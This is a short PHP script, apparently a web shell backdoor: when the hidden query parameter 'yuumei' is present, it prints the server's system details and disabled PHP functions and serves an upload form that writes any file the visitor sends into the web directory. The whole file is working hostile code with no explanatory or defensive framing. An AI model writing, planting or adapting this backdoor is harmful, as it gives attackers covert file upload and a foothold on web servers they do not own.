<?php
if(isset($_GET["yuumei"]))
 {
  echo "<center><font color=lime>".php_uname()."";
  print "\n";$disable_functions = @ini_get("disable_functions");
  echo "<br>DisablePHP=".$disable_functions; print "\n";
  echo "<form method=post enctype=multipart/form-data>"; 
  echo "<input type=file name=f><input name=k type=submit id=k value=upload><br>"; 
    if($_POST["k"]==upload)
{ if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){ echo"<b>".$_FILES["f"]["name"];}else{ echo"<b color=red>unable to upload!";}}}
